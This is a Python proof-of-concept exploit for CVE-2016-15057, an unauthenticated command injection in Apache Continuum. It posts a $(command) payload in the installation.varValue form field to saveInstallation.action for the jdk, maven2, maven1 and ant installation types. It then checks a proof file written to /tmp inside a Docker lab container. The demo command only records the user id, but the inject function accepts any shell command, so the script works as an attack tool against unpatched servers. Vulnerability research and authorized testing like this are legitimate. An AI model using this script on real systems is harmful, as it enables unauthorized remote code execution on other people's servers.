#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Continuum 1.4.2 - Unauthenticated Command Injection (Multi-Type)
# CVE            : CVE-2016-15057
# Vendor         : Apache Software Foundation
# Product        : Apache Continuum
# Affected       : All versions (up to 1.4.2)
# Type           : CWE-77 - Command Injection
# CVSS           : 9.9 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC Vector 3 for CVE-2016-15057: Multiple Installation Types

Demonstrates that the command injection works across ALL installation types
that have an ExecutorConfigurator: jdk, maven2, maven1, ant.

Each type constructs a different executable path:
  - jdk:    <varValue>/bin/java -version
  - maven2: <varValue>/bin/mvn -v
  - maven1: <varValue>/bin/maven -v
  - ant:    <varValue>/bin/ant -version

All paths are executed via /bin/sh -c, so $(command) substitution works
regardless of which installation type is used.

Usage:
    python3 poc_vector3_multi_type.py <target_host> [port]
"""
import sys
import time
import http.client
import urllib.parse

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

DEFAULT_HOST = "172.19.0.6"
DEFAULT_PORT = 8080
TIMEOUT = 30

# Installation types that trigger immediate execution during validation
INSTALL_TYPES = {
    "jdk":    {"executable": "java",  "version_arg": "-version"},
    "maven2": {"executable": "mvn",   "version_arg": "-v"},
    "maven1": {"executable": "maven", "version_arg": "-v"},
    "ant":    {"executable": "ant",   "version_arg": "-version"},
}


def banner():
    print(f"""{BOLD}{CYAN}
╔════════════════════════════════════════════════════════════╗
║  CVE-2016-15057 — Apache Continuum Command Injection       ║
║  Vector 3: All installation types (jdk, maven2, maven1, ant)║
╚════════════════════════════════════════════════════════════╝{RESET}
""")


def inject(host, port, install_type, command, install_name=None):
    """Inject command via specified installation type."""
    if install_name is None:
        install_name = f"test_{install_type}"
    payload = f"$({command})"

    form_data = urllib.parse.urlencode({
        "installation.name": install_name,
        "installation.type": install_type,
        "installation.varValue": payload,
    })

    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    try:
        conn = http.client.HTTPConnection(host, port, timeout=TIMEOUT)
        conn.request("POST", "/continuum/saveInstallation.action", body=form_data, headers=headers)
        resp = conn.getresponse()
        body = resp.read()
        conn.close()
        return resp.status, len(body)
    except Exception as e:
        return None, str(e)


def verify_file(filepath, container_name="cve-2016-15057-vulnerable"):
    """Read a file from the container."""
    import subprocess
    try:
        result = subprocess.run(
            ["docker", "exec", container_name, "cat", filepath],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            return result.stdout.strip()
        return None
    except Exception:
        return None


def cleanup(container_name="cve-2016-15057-vulnerable"):
    import subprocess
    for itype in INSTALL_TYPES:
        try:
            subprocess.run(
                ["docker", "exec", container_name, "rm", "-f", f"/tmp/proof_{itype}"],
                capture_output=True, timeout=10
            )
        except Exception:
            pass


def exploit(target_host, target_port):
    banner()

    cleanup()

    results = {}

    for install_type, info in INSTALL_TYPES.items():
        proof_file = f"/tmp/proof_{install_type}"
        print(f"\n{CYAN}[*] Testing installation type: {install_type}{RESET}")
        print(f"    Server will construct: $(...)/bin/{info['executable']} {info['version_arg']}")

        # Inject command to write proof file with type identifier
        command = f"echo 'type={install_type} uid='$(id -u) > {proof_file}"
        status, size = inject(target_host, target_port, install_type, command)

        if status is None:
            print(f"{RED}    [-] Request failed: {size}{RESET}")
            results[install_type] = {"status": "FAILED", "proof": None}
            continue

        print(f"    Response: HTTP {status} ({size} bytes)")

        # Wait for execution
        time.sleep(2)

        # Verify
        proof = verify_file(proof_file)
        if proof:
            print(f"{GREEN}    [+] CONFIRMED: {proof}{RESET}")
            results[install_type] = {"status": "CONFIRMED", "proof": proof}
        else:
            print(f"{YELLOW}    [!] Proof file not found{RESET}")
            results[install_type] = {"status": "UNVERIFIED", "proof": None}

    # Summary
    print(f"\n{'='*60}")
    print(f"{BOLD}Installation Type Injection Results:{RESET}")
    print(f"{'='*60}")

    confirmed_count = 0
    for itype, result in results.items():
        marker = f"{GREEN}✓{RESET}" if result["status"] == "CONFIRMED" else f"{RED}✗{RESET}"
        print(f"  {marker} {itype:8s} — {result['status']}")
        if result["status"] == "CONFIRMED":
            confirmed_count += 1

    print(f"\n{BOLD}  {confirmed_count}/{len(INSTALL_TYPES)} installation types vulnerable{RESET}")

    if confirmed_count > 0:
        print(f"{GREEN}{BOLD}\n[✓] VECTOR 3 CONFIRMED: Multiple installation types exploitable{RESET}")
    else:
        print(f"{RED}{BOLD}\n[✗] VECTOR 3 UNVERIFIED{RESET}")
    print(f"{'='*60}")

    return confirmed_count > 0


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    success = exploit(target, port)
    sys.exit(0 if success else 1)
